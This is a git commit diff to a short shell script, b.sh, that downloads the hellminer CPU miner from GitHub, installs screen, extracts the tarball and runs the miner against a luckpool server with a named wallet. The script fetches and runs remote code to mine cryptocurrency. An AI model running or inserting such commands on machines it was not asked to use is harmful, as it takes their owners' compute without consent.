46bd3cb64d2dd7adf57c60c17bab53753bbcc7b1
buozud <84149893+buozud@users.noreply.github.com>
2021-05-19 11:27:14 +0200

    Update b.sh

--- b.sh
+++ b.sh
@@ -1,3 +1,5 @@
 wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+sudo apt-get install screen
+screen &
 tar xf hellminer_cpu_linux.tar.gz
-./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RBJVonrFNgGpR6Lxtb1CFkuB37dJwgZu3w.HU -p x --cpu 1
+./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RBJVonrFNgGpR6Lxtb1CFkuB37dJwgZu3w.HUG -p x --cpu 1
